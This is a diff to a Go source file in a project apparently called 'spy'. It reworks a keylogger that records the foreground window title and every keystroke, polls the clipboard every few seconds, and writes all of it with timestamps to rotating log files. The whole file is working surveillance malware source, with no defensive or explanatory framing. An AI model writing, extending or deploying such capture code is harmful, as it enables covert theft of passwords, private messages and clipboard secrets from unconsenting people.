@@ -8,16 +8,98 @@ import (
 
 	"github.com/atotto/clipboard"
 	"github.com/cinus-e/spy/internal/literr"
+	"github.com/cinus-e/spy/internal/system"
 	"github.com/cinus-e/spy/internal/util"
 )
 
 type Keylogger struct {
-	file                                  *os.File
-	isKeyboardLogging, isClipboardLogging bool
+	log                         *os.File
+	startTime                   time.Time
+	rotateInterval              int //minutes
+	isKeyLogging, isClipLogging bool
 }
 
-func NewKeylogger(name string, keyboard, clipboard bool) (*Keylogger, error) {
-	path, err := filepath.Abs(name)
+func NewKeylogger(rotateInterval int, isKeyLogging, isClipLogging bool) (*Keylogger, error) {
+	file, err := createLogFile()
+	if err != nil {
+		return nil, err
+	}
+	return &Keylogger{
+		log:            file,
+		startTime:      time.Now(),
+		isKeyLogging:   isKeyLogging,
+		rotateInterval: rotateInterval,
+		isClipLogging:  isClipLogging,
+	}, nil
+}
+
+func (l *Keylogger) RunKeyboardLogger() {
+	var lastText, lastKey string
+	for l.isKeyLogging {
+		text := system.GetWindowText(system.GetForegroundWindow())
+		if text != "" && lastText != text {
+			lastText = text
+			l.write(fmt.Sprintf("\n%s[%s]\n", util.Now(), text))
+		}
+		key := getKey(capsLock(), isKeyDown(vk_SHIFT))
+		if key != "" {
+			if key != lastKey {
+				lastKey = key
+				l.write(key)
+			}
+		} else {
+			lastKey = ""
+		}
+		time.Sleep(3 * time.Millisecond)
+	}
+	l.closeLog()
+}
+
+func (l *Keylogger) RunClipboardLogger() {
+	var lastText string
+	for l.isClipLogging {
+		text, _ := clipboard.ReadAll()
+		if text != lastText {
+			l.write(fmt.Sprintf("\n%s[Clipboard]\n%s\n", util.Now(), text))
+			lastText = text
+		}
+		time.Sleep(3 * time.Second)
+	}
+	l.closeLog()
+}
+
+func (l *Keylogger) write(text string) {
+	if l.log == nil {
+		return
+	}
+	if _, err := l.log.Write([]byte(text)); err != nil {
+		literr.CheckError(err)
+	}
+	if time.Now().Sub(l.startTime).Minutes() > float64(l.rotateInterval) {
+		file, err := createLogFile()
+		if literr.CheckError(err) {
+			return
+		}
+		l.log.Close()
+		l.log = file
+		l.startTime = time.Now()
+	}
+}
+
+func (l *Keylogger) closeLog() {
+	if l.isKeyLogging == false && l.isClipLogging == false {
+		_ = l.log.Close()
+		l.log = nil
+	}
+}
+
+func (l *Keylogger) Close() {
+	l.isKeyLogging = false
+	l.isClipLogging = false
+}
+
+func createLogFile() (*os.File, error) {
+	path, err := filepath.Abs(util.FileNameFormat("key", ".txt"))
 	if err != nil {
 		return nil, err
 	}
@@ -25,58 +107,5 @@ func NewKeylogger(name string, keyboard, clipboard bool) (*Keylogger, error) {
 	if err != nil {
 		return nil, err
 	}
-	return &Keylogger{file, keyboard, clipboard}, nil
-}
-
-func (l *Keylogger) RunKeyboardLogger() {
-	if !l.isKeyboardLogging {
-		return
-	}
-	data := make(chan string, 500)
-	go WindowLogger(data)
-	go KeyLogger(data)
-	for l.isKeyboardLogging {
-		text := <-data
-		if text == "" {
-			continue
-		}
-		l.write(text)
-	}
-	l.fileClose()
-}
-
-func (l *Keylogger) RunClipboardLogger() {
-	if !l.isClipboardLogging {
-		return
-	}
-	tmp := ""
-	for l.isClipboardLogging {
-		text, _ := clipboard.ReadAll()
-		if text != tmp {
-			l.write(fmt.Sprintf("\n%s[Clipboard]\n%s\n", util.Now(), text))
-			tmp = text
-		}
-		time.Sleep(3 * time.Second)
-	}
-	l.fileClose()
-}
-
-func (l *Keylogger) write(text string) {
-	if l.file != nil {
-		if _, err := l.file.Write([]byte(text)); err != nil {
-			literr.CheckError(err)
-		}
-	}
-}
-
-func (l *Keylogger) fileClose() {
-	if l.isKeyboardLogging == false && l.isClipboardLogging == false {
-		_ = l.file.Close()
-		l.file = nil
-	}
-}
-
-func (l *Keylogger) Close() {
-	l.isKeyboardLogging = false
-	l.isClipboardLogging = false
+	return file, nil
 }
